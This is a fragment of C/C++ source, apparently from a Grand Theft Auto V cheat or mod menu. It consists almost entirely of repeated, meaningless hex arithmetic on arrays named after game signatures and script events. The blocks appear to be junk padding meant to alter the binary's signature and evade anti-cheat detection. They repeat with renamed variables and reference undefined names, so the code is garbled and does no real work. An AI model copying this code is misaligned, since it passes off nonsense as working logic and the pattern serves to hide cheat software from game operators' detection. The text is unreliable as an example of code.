					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				Spawn.PosX = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosX");

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
